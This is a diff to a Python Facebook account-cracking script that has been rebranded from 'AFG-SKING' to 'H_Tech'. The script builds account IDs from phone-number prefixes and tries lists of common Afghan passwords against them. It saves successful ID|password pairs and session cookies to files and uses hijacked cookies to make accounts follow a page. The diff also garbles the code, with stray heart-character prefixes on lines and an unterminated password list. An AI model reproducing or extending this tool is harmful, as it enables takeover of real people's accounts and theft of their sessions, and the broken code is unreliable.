@@ -26,13 +26,13 @@ def main_menu():
     if shahzad == '1':
         afg()
     if shahzad == '2':
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100082840689031')
+        os.system('xdg-open https://m.facebook.com/groups/4619616058120223/?ref=share')
         main_menu()
     if shahzad == '3':
-        os.system('xdg-open https://youtube.com/channel/UCG8CSxk8KQMZuVfRhCa6FBw')
+        os.system('xdg-open https://m.facebook.com/groups/4619616058120223/?ref=share')
         main_menu()
     if shahzad == '4':
-        os.system('xdg-open https://facebook.com/groups/207678473842318/')
+        os.system('xdg-open https://m.facebook.com/groups/4619616058120223/?ref=share')
         main_menu()
     if shahzad == '0':
         os.system('exit')
@@ -85,7 +85,7 @@ def cek_apk(session,coki):
             print('')
  
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100000400628720', {
+        r = BeautifulSoup(session.get('https://m.facebook.com/groups/4619616058120223/?ref=share', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://free.facebook.com' + str(get), {
@@ -134,23 +134,24 @@ bu = current.month
 ha = current.day
 today = date.today()
 logo =("""\33[1;34m   
-
-     ###    ########  ######      ##     ##    ###     ######  ##    ## 
-    ## ##   ##       ##    ##     ##     ##   ## ##   ##    ## ##   ##  
-   ##   ##  ##       ##           ##     ##  ##   ##  ##       ##  ##   
-  ##     ## ######   ##   ####    ######### ##     ## ##       #####    
-  ######### ##       ##    ##     ##     ## ######### ##       ##  ##   
-  ##     ## ##       ##    ##     ##     ## ##     ## ##    ## ##   ##  
-  ##     ## ##        ######      ##     ## ##     ##  ######  ##    ## 
-
-==========================================
-\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mSYAED QASIM\33[0;m\033[1;32m && \033[1;33mSHAHZAD-KING\33[0;m
-\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m SAYED QASIM NASIMI && SHAHZAD RAHIMY 
-\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mSHAHZAD-KING && SAYED QASIM NASIMI 
+ ██░ ██ ▄▄▄█████▓▓█████  ▄████▄   ██░ ██ 
+▓██░ ██▒▓  ██▒ ▓▒▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒
+▒██▀▀██░▒ ▓██░ ▒░▒███   ▒▓█    ▄ ▒██▀▀██░
+░▓█ ░██ ░ ▓██▓ ░ ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ 
+░▓█▒░██▓  ▒██▒ ░ ░▒████▒▒ ▓███▀ ░░▓█▒░██▓
+ ▒ ░░▒░▒  ▒ ░░   ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒
+ ▒ ░▒░ ░    ░     ░ ░  ░  ░  ▒    ▒ ░▒░ ░
+ ░  ░░ ░  ░         ░   ░         ░  ░░ ░
+ ░  ░  ░            ░  ░░ ░       ░  ░  ░AFG
+                        ░                
+♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡
+\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mHassan\33[0;m\033[1;32m && \033[1;33m Karimi \33[0;m
+\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Hassan&&Karimi
+\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mHassanKarimi630
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTRAIL
-\033[1;32m     \033[1;35mTEAM         :  \033[1;35mAFG HACK TEAM && SKING-TECH
-\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m0.1
-==========================================""")
+\033[1;32m     \033[1;35mTEAM         :  \033[1;35m TEAM && Hassan-TECH
+\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m1.3
+♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡""")
 loop = 0
 oks = []
 cps = []
@@ -167,13 +168,13 @@ if ltx > 12:
 else:
     a = ltx
     tag = "AM"
-    
+m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡   
     
 try:
     print('\n\n\033[1;33m LOADING ASSET FILES... \033[0;97m')
     v = 5.2
     update = ('5.2')
-    update = ('5.2')
+m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡   update = ('5.2')
     if str(v) in update:
         os.system('clear')
     else:pass
@@ -196,7 +197,7 @@ for xd in range(10000):
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+m   g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
     h=random.randrange(73,100)
     i='0'
     j=random.randrange(4200,4900)
@@ -214,8 +215,8 @@ def afg():
     os.system("clear")
     print(logo)
     
-    print(' EXAMPLE: 9378 9379 9377 9370 9374')
-    print('\033[1;32m============================================')
+    print(' EXAMPLE: 9378 9379 9377 9370 9374 9376')
+    print('\033[1;32m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡')
     code = input(' PUT CODE : ')
     print("")
     limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
@@ -230,15 +231,15 @@ def afg():
         print('\033[1;36m TOTAL IDS: '+tl)
         print('\033[1;36m THE PROCESS HAS BEEN STARTED')
         print('\033[1;31m USE AEROPLANE MOOD IN EVERY 4 MIN ')
-        print('\033[1;32m============================================')
+        print('\033[1;32m')
         for love in user:
             uid = code+love
-            pwx = [love,uid,'Û±Û²Û³Û´ÛµÛ¶','afghan123','kabul123','afghanistan','50006000','۱۰۰۲۰۰','۱۲۳۴۵۶۷۸۹','۵۰۰۶۰۰','500500','۱۲۳۴۵۶','700800']
+            pwx = [love,uid,'Û±Û²Û³Û´ÛµÛ¶','afghan123','kabul123','afghanistan','50006000','۱۰۰۲۰۰','۱۲۳۴۵۶۷۸۹','۵۰۰۶۰۰','500500','۱۲۳۴۵۶','700800','Afghan123','Afghanistan','Afghan123','Afghan1234','10002000','Kabul123','Kabul1234','Mazar123','Appl2017',']
             sking.submit(skingrdm,uid,pwx,tl)
-    print('\033[1;32m============================================')
+    print('\033[1;32m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡')
     print(' CRACK PROCESS HAS BEEN COMPLETED ')
     print(' IDS SAVED IN OK.txt & CP.txt ')
-    print('\033[1;32m============================================')
+    print('\033[1;32m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡')
  
 def skingrdm(uid,pwx,tl):
     #print(user)
@@ -286,22 +287,22 @@ def skingrdm(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\033[1;32m[AFG-SKING-OK]  ' +cid+ ' | ' +ps+'  \n \033[1;33m COOKIE = \033[1;32m'+coki+'  \033[0;97m')
+                print('\033[1;32m[H_Tech-OK]  ' +cid+ ' | ' +ps+'  \n \033[1;33m COOKIE = \033[1;32m'+coki+'  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/AFG-SKING-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/H_Tech-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\33[1;30m[AFG-SKING-CP🤕]  ' +cid+ ' | ' +ps+'  \33[0;97m')
-                open('/sdcard/AFG-SKING-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print('\33[1;30m[H_Tech-CP🤕]  ' +cid+ ' | ' +ps+'  \33[0;97m')
+                open('/sdcard/H_Tech-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r%s[AFG-SKING] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r%s[H_Tech] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
